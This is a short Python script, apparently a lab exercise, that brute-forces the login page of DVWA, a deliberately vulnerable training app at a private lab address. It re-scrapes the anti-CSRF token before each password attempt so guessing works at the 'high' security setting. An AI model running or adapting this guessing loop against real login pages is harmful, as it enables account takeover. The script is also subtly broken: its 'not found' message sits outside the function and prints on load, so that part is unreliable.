import requests
from bs4 import BeautifulSoup

# ===================== 配置区，修改这里 =====================
TARGET_URL = "http://192.168.31.129/vulnerabilities/brute/"
USERNAME = "admin"
# 你的DVWA PHPSESSID，浏览器F12获取
PHPSESSID = "gabjt1b9121ucigerdne3gkft0"
SECURITY_LEVEL = "high"
f=[
          "1223",
          "password",
          "test"
]
SUCCESS_FLAG = "Welcome to the password protected area admin"
# ==========================================================

# 保持会话，自动维护Cookie
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
session.cookies.set("security", SECURITY_LEVEL)


def get_current_token():
    """访问页面，提取当前页面的user_token"""
    resp = session.get(TARGET_URL)
    soup = BeautifulSoup(resp.text, "html.parser")
    # 找到隐藏input user_token
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        return token_input["value"]
    return None


def brute():

        for pwd in f:
            pwd = pwd.strip()
            if not pwd:
                continue

            token = get_current_token()
            if token is None:
                print("[!] 获取token失败")
                break
                
            params = {
                "username": USERNAME,
                "password": pwd,
                "Login": "Login",
                "user_token": token
            }
            print(f"[*] 尝试密码: {pwd}, token:{token[:10]}...")
            res = session.get(TARGET_URL, params=params)

            if SUCCESS_FLAG in res.text:
                print(f"\n[✅] 爆破成功！用户名:{USERNAME} 密码:{pwd}")
                return
print("\n[❌] 字典遍历完毕，未找到密码")


if __name__ == "__main__":
    brute()
